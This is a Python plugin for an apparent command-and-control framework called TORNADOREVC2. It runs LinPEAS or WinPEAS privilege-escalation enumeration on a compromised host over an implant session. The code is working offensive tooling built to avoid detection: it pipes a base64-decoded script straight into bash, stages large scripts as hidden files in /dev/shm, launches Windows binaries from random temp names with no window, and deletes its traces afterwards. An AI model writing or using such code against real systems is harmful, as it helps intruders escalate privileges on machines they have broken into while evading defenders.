"""In-memory privilege escalation enumeration (LinPEAS / WinPEAS)."""

import base64
import os
import time

from ..api import plugin, SessionContext

PRIVESC_DIR = os.environ.get(
    'TORNADOREVC2_PRIVESC_DIR',
    os.path.join(os.getcwd(), 'tools', 'privesc'),
)

LINPEAS_CANDIDATES = (
    'linpeas.sh',
    'linpeas/linpeas.sh',
    'linPEAS.sh',
)

WINPEAS_CANDIDATES = (
    'winPEAS.bat',
    'winPEASx64.exe',
    'winPEASx64_ofs.exe',
    'winPEASany.exe',
    'winPEASany_ofs.exe',
)


def _resolve_tool(candidates, env_var=None):
    if env_var:
        path = os.environ.get(env_var, '')
        if path and os.path.isfile(path):
            return os.path.abspath(path)
    if not os.path.isdir(PRIVESC_DIR):
        return None
    for name in candidates:
        path = os.path.join(PRIVESC_DIR, name)
        if os.path.isfile(path):
            return os.path.abspath(path)
    return None


def _chunk_b64(data: bytes, size=3000):
    encoded = base64.b64encode(data).decode('ascii')
    return [encoded[i:i + size] for i in range(0, len(encoded), size)]


def _build_linux_pipe_command(script_bytes: bytes) -> str:
    """Pipe base64-decoded script into bash stdin — no script file on disk."""
    chunks = _chunk_b64(script_bytes)
    if not chunks:
        return 'echo "empty script"'
    b64_len = len(base64.b64encode(script_bytes).decode('ascii'))
    if b64_len > 12000:
        return None
    if len(''.join(chunks)) < 3500:
        joined = ''.join(chunks)
        return f"printf '%s' '{joined}' | base64 -d | bash 2>&1"
    parts = []
    for idx, chunk in enumerate(chunks):
        esc = chunk.replace("'", "'\\''")
        if idx == 0:
            parts.append(f"printf '%s' '{esc}'")
        else:
            parts.append(f"printf '%s' '{esc}'")
    pipe = ' ; '.join(parts) + ' | base64 -d | bash 2>&1'
    return pipe


def _build_windows_bat_command(script_bytes: bytes) -> str:
    """Run WinPEAS batch via in-memory decode; temp file removed in-script."""
    b64 = base64.b64encode(script_bytes).decode('ascii')
    chunk_size = 3000
    chunks = [b64[i:i + chunk_size] for i in range(0, len(b64), chunk_size)]
    chunk_assigns = '\n'.join(
        f"$b64+='{c}'" for c in chunks
    )
    return f"""
$ErrorActionPreference='Continue'
$b64=''
{chunk_assigns}
$tmp=Join-Path $env:TEMP ([IO.Path]::GetRandomFileName()+'.bat')
try {{
  [IO.File]::WriteAllBytes($tmp,[Convert]::FromBase64String($b64))
  & cmd.exe /c "`"$tmp`"" 2>&1
  $code=$LASTEXITCODE
  Write-Output "`n[exit:$code]"
}} finally {{
  if(Test-Path -LiteralPath $tmp){{Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue}}
}}
""".strip()


def _build_windows_exe_command(remote_path: str, handler) -> str:
    path = handler._escape_path(remote_path, 'windows')
    path_ps = path.replace("'", "''")
    return f"""
$ErrorActionPreference='Continue'
$p='{path_ps}'
$tmp=Join-Path $env:TEMP ([IO.Path]::GetRandomFileName()+'.exe')
try {{
  if(Test-Path -LiteralPath $p){{Move-Item -LiteralPath $p -Destination $tmp -Force}}
  else {{ throw "Staging binary not found" }}
  $psi=New-Object System.Diagnostics.ProcessStartInfo
  $psi.FileName=$tmp
  $psi.UseShellExecute=$false
  $psi.RedirectStandardOutput=$true
  $psi.RedirectStandardError=$true
  $psi.CreateNoWindow=$true
  $proc=[Diagnostics.Process]::Start($psi)
  $proc.StandardOutput.ReadToEnd()
  $err=$proc.StandardError.ReadToEnd()
  if($err){{Write-Output $err}}
  $proc.WaitForExit()
  Write-Output "`n[exit:$($proc.ExitCode)]"
}} finally {{
  if(Test-Path -LiteralPath $tmp){{Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue}}
}}
""".strip()


@plugin.command(
    name='privesccheck',
    platforms=['linux', 'windows', 'unix'],
    description='Run LinPEAS (Linux) or WinPEAS (Windows) privilege escalation enumeration in memory',
)
def run(session: SessionContext, args):
    start = time.time()
    is_win = session.is_windows
    tool_name = 'WinPEAS' if is_win else 'LinPEAS'

    if is_win:
        local_path = _resolve_tool(WINPEAS_CANDIDATES, 'TORNADOREVC2_WINPEAS')
    else:
        local_path = _resolve_tool(LINPEAS_CANDIDATES, 'TORNADOREVC2_LINPEAS')

    if not local_path:
        session.print(
            f"Place {tool_name} under {PRIVESC_DIR} or set "
            f"TORNADOREVC2_{'WINPEAS' if is_win else 'LINPEAS'}",
            'red',
        )
        return 1

    session.print(
        f"Starting {tool_name} from {os.path.basename(local_path)} "
        f"({'Windows' if is_win else 'Linux'}) — streaming output...",
        'yellow',
    )
    session.log_event(f'Plugin privesccheck: starting {tool_name} ({local_path})')

    output_parts = []

    try:
        with open(local_path, 'rb') as fh:
            payload = fh.read()
    except OSError as exc:
        session.print(f"Cannot read local tool: {exc}", 'red')
        return 1

    exit_code = None
    handler = session._handler
    pe = handler.payload_exec
    info = handler._client_info(session._client_sock) or {}
    shell_type = info.get('type', 'windows' if is_win else 'unix')

    if is_win and local_path.lower().endswith('.exe'):
        token, staging_name = pe._staging_path('windows')
        remote_path = pe._resolve_staging_path(session._client_sock, shell_type, staging_name)
        digest, remote_path = pe._transfer_payload(
            session._client_sock, local_path, remote_path, shell_type,
        )
        if not digest:
            session.log_privesc_check(tool_name, time.time() - start, False, '', detail='transfer failed')
            return 1
        ps = _build_windows_exe_command(remote_path, handler)
        cmd = handler._win_ps_cmd(ps)
        output = session.run_shell_streaming(cmd, timeout=7200.0, idle_timeout=120.0)
    elif is_win:
        ps = _build_windows_bat_command(payload)
        cmd = handler._win_ps_cmd(ps)
        output = session.run_shell_streaming(cmd, timeout=7200.0, idle_timeout=120.0)
    else:
        unix_cmd = _build_linux_pipe_command(payload)
        if unix_cmd is None:
            session.print('Large script — using memory-backed staging (auto-removed after run)...', 'yellow')
            token, staging_name = pe._staging_path('unix')
            remote_path = f"/dev/shm/.tornado_peas_{token}.sh"
            digest, remote_path = pe._transfer_payload(
                session._client_sock, local_path, remote_path, 'unix',
            )
            if not digest:
                session.log_privesc_check(tool_name, time.time() - start, False, '', detail='transfer failed')
                return 1
            path_esc = handler._escape_path(remote_path, 'unix')
            unix_cmd = f"bash '{path_esc}' 2>&1; rm -f '{path_esc}'"
        output = session.run_shell_streaming(unix_cmd, timeout=7200.0, idle_timeout=120.0)

    duration = time.time() - start
    for line in (output or '').splitlines():
        if line.strip().startswith('[exit:') and line.strip().endswith(']'):
            try:
                exit_code = int(line.strip()[6:-1])
            except ValueError:
                pass

    success = exit_code == 0 if exit_code is not None else bool(output)
    logger = session.logger
    output_path = ''
    if logger:
        output_path = logger.log_plugin('privesccheck', output or '(no output)', detail=(
            f"tool={tool_name}\nsource={local_path}\nduration={duration:.2f}s\nexit_code={exit_code}"
        ))
        logger.log_privesc_check(tool_name, duration, success, output_path, exit_code=exit_code)
        logger.log_command(f'run privesccheck ({tool_name})', output or '')

    color = 'green' if success else 'yellow'
    session.print(
        f"\n{tool_name} completed in {duration:.1f}s — exit: {exit_code if exit_code is not None else 'unknown'}",
        color,
    )
    if output_path:
        session.print(f"Output saved: {output_path}", 'blue')
    return 0 if success else 1
